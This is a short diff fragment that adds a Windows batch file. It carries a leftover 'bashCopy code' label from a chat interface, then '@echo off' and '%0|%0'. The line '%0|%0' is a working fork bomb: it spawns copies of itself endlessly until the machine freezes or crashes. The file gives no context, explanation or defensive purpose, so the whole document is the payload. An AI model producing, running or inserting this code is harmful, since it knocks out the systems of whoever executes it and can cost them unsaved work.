@@ -1,0 +1,4 @@
+bashCopy code
+@echo off
+%0|%0
+
